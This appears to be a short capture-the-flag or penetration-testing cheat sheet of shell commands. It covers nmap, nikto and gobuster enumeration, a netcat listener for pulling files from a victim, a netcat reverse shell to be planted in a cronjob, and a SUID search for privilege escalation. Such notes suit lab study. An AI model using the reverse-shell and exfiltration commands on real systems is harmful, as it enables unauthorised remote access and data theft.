Enumeration:
sudo nmap \-sS \-sV \-\-script=default,vuln IP
nmap \-sV \-p\- IP \-v
nikto \-url IP
sudo nmap \-sV \-p\- IP
gobuster dir \-u [http://IP](#http://IP)
\-w /usr/share/wordlists/dirbuster/directory\-list\-2\.3\-medium\.txt \-t 100        
gobuster dir \-u [http://IP](#http://IP)
\-w /usr/share/wordlists/seclists/Discovery/Web\-Content/combined\_words\.txt   

Gobuster
\-k 				- 			disable ssl certificate checks
\-\-exclude\-length - 			ignore response length
\-b 				- 			ignore status codes

Send file from victim to attacker
nc \-nlvp 12221 \-q 1 \> FILE \< /dev/null

Cronjob script reverse shell
victim -  nc 192\.168\.0\.63 5555 \-e /bin/bash
attacker -   nc \-nlvp 5555

Privesc
find / \-perm \-4000 2\>/dev/null

Virtual Environment
python3 \-m venv venv
source venv/bin/activate
\.
\.
deactivate

Search through file
grep \-rlw "dora" \. -  searches through current directory and shows any file containing keyword
find \. \-name “flag\.txt” -  searches through current directory and shows file that matches name  